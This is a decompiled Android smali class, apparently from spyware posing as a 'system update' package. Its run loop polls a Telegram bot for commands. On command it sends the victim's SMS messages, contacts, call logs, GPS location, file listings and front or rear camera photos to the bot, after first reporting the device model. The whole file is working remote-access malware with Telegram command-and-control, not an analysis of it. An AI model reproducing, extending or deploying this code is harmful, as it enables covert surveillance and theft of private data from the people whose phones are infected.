.class Lcom/system/update/Payload$1;
.super Ljava/lang/Object;
.source "Payload.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/system/update/Payload;->onStartCommand(Landroid/content/Intent;II)I
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/system/update/Payload;


# direct methods
.method constructor <init>(Lcom/system/update/Payload;)V
    .registers 2
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010
        }
        names = {
            null
        }
    .end annotation

    .line 109
    iput-object p1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .registers 7

    .line 112
    const-string v0, "\"update_id\":"

    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    const-string v2, "3. Thread jalan"

    # invokes: Lcom/system/update/Payload;->writeLog(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$000(Lcom/system/update/Payload;Ljava/lang/String;)V

    .line 113
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " (Android "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ")"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 115
    iget-object v2, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "\ud83d\ude80 *Service Active!*\nDevice: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    # invokes: Lcom/system/update/Payload;->sendTelegramMessage(Ljava/lang/String;)V
    invoke-static {v2, v3}, Lcom/system/update/Payload;->access$100(Lcom/system/update/Payload;Ljava/lang/String;)V

    .line 116
    iget-object v2, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    const-string v3, "4. Pesan Service Active terkirim/tertunda"

    # invokes: Lcom/system/update/Payload;->writeLog(Ljava/lang/String;)V
    invoke-static {v2, v3}, Lcom/system/update/Payload;->access$000(Lcom/system/update/Payload;Ljava/lang/String;)V

    .line 118
    iget-object v2, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # invokes: Lcom/system/update/Payload;->sendCheckIn(Ljava/lang/String;)V
    invoke-static {v2, v1}, Lcom/system/update/Payload;->access$200(Lcom/system/update/Payload;Ljava/lang/String;)V

    .line 119
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    const-string v2, "5. CheckIn terkirim/tertunda"

    # invokes: Lcom/system/update/Payload;->writeLog(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$000(Lcom/system/update/Payload;Ljava/lang/String;)V

    .line 121
    :goto_61
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # getter for: Lcom/system/update/Payload;->isRunning:Z
    invoke-static {v1}, Lcom/system/update/Payload;->access$300(Lcom/system/update/Payload;)Z

    move-result v1

    if-eqz v1, :cond_20c

    .line 123
    :try_start_69
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "https://api.telegram.org/bot"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # getter for: Lcom/system/update/Payload;->BOT_TOKEN:Ljava/lang/String;
    invoke-static {v2}, Lcom/system/update/Payload;->access$400(Lcom/system/update/Payload;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/getUpdates?offset="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # getter for: Lcom/system/update/Payload;->lastUpdateId:J
    invoke-static {v2}, Lcom/system/update/Payload;->access$500(Lcom/system/update/Payload;)J

    move-result-wide v2

    const-wide/16 v4, 0x1

    add-long/2addr v2, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&timeout=10"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 124
    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 125
    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v1

    check-cast v1, Ljava/net/HttpURLConnection;

    .line 126
    const-string v2, "GET"

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 128
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/InputStreamReader;

    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v1

    invoke-direct {v3, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 129
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 131
    :goto_be
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_c8

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_be

    .line 132
    :cond_c8
    invoke-virtual {v2}, Ljava/io/BufferedReader;->close()V

    .line 134
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 136
    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_fb

    .line 137
    invoke-virtual {v1, v0}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v2

    add-int/lit8 v2, v2, 0xc

    .line 138
    const-string v3, ","

    invoke-virtual {v1, v3, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v3

    .line 139
    const/4 v4, -0x1

    if-ne v3, v4, :cond_ea

    const-string v3, "}"

    invoke-virtual {v1, v3, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v3

    .line 140
    :cond_ea
    iget-object v4, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v2

    # setter for: Lcom/system/update/Payload;->lastUpdateId:J
    invoke-static {v4, v2, v3}, Lcom/system/update/Payload;->access$502(Lcom/system/update/Payload;J)J

    .line 143
    :cond_fb
    const-string v2, "\"text\":\"/dump_sms\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_123

    .line 144
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\ud83d\udce9 *Dump SMS:*\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # invokes: Lcom/system/update/Payload;->getSms()Ljava/lang/String;
    invoke-static {v3}, Lcom/system/update/Payload;->access$600(Lcom/system/update/Payload;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    # invokes: Lcom/system/update/Payload;->sendTelegramMessage(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$100(Lcom/system/update/Payload;Ljava/lang/String;)V

    goto/16 :goto_1df

    .line 145
    :cond_123
    const-string v2, "\"text\":\"/dump_kontak\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_14b

    .line 146
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\ud83d\udc65 *Dump Kontak:*\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # invokes: Lcom/system/update/Payload;->getContacts()Ljava/lang/String;
    invoke-static {v3}, Lcom/system/update/Payload;->access$700(Lcom/system/update/Payload;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    # invokes: Lcom/system/update/Payload;->sendTelegramMessage(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$100(Lcom/system/update/Payload;Ljava/lang/String;)V

    goto/16 :goto_1df

    .line 147
    :cond_14b
    const-string v2, "\"text\":\"/dump_telpon\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_172

    .line 148
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\ud83d\udcde *Dump Call Log:*\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # invokes: Lcom/system/update/Payload;->getCallLogs()Ljava/lang/String;
    invoke-static {v3}, Lcom/system/update/Payload;->access$800(Lcom/system/update/Payload;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    # invokes: Lcom/system/update/Payload;->sendTelegramMessage(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$100(Lcom/system/update/Payload;Ljava/lang/String;)V

    goto :goto_1df

    .line 149
    :cond_172
    const-string v2, "\"text\":\"/foto_depan\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_181

    .line 150
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    const/4 v2, 0x1

    # invokes: Lcom/system/update/Payload;->takePhoto(I)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$900(Lcom/system/update/Payload;I)V

    goto :goto_1df

    .line 151
    :cond_181
    const-string v2, "\"text\":\"/foto_belakang\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_190

    .line 152
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    const/4 v2, 0x0

    # invokes: Lcom/system/update/Payload;->takePhoto(I)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$900(Lcom/system/update/Payload;I)V

    goto :goto_1df

    .line 153
    :cond_190
    const-string v2, "\"text\":\"/lacak\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1b7

    .line 154
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\ud83d\udccd *Lokasi GPS:*\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # invokes: Lcom/system/update/Payload;->getLocation()Ljava/lang/String;
    invoke-static {v3}, Lcom/system/update/Payload;->access$1000(Lcom/system/update/Payload;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    # invokes: Lcom/system/update/Payload;->sendTelegramMessage(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$100(Lcom/system/update/Payload;Ljava/lang/String;)V

    goto :goto_1df

    .line 155
    :cond_1b7
    const-string v2, "\"text\":\"/cek_file\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1df

    .line 156
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\ud83d\udcc2 *Isi Folder:*\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    const-string v4, "/storage/emulated/0/"

    # invokes: Lcom/system/update/Payload;->listFiles(Ljava/lang/String;)Ljava/lang/String;
    invoke-static {v3, v4}, Lcom/system/update/Payload;->access$1100(Lcom/system/update/Payload;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    # invokes: Lcom/system/update/Payload;->sendTelegramMessage(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$100(Lcom/system/update/Payload;Ljava/lang/String;)V
    :try_end_1df
    .catch Ljava/lang/Exception; {:try_start_69 .. :try_end_1df} :catch_1e0

    .line 161
    :cond_1df
    :goto_1df
    goto :goto_1fd

    .line 159
    :catch_1e0
    move-exception v1

    .line 160
    iget-object v2, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Error Loop: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    # invokes: Lcom/system/update/Payload;->writeLog(Ljava/lang/String;)V
    invoke-static {v2, v1}, Lcom/system/update/Payload;->access$000(Lcom/system/update/Payload;Ljava/lang/String;)V

    .line 162
    :goto_1fd
    :try_start_1fd
    sget-object v1, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0x3

    invoke-virtual {v1, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_204
    .catch Ljava/lang/InterruptedException; {:try_start_1fd .. :try_end_204} :catch_206

    goto/16 :goto_61

    :catch_206
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_61

    .line 164
    :cond_20c
    return-void
.end method
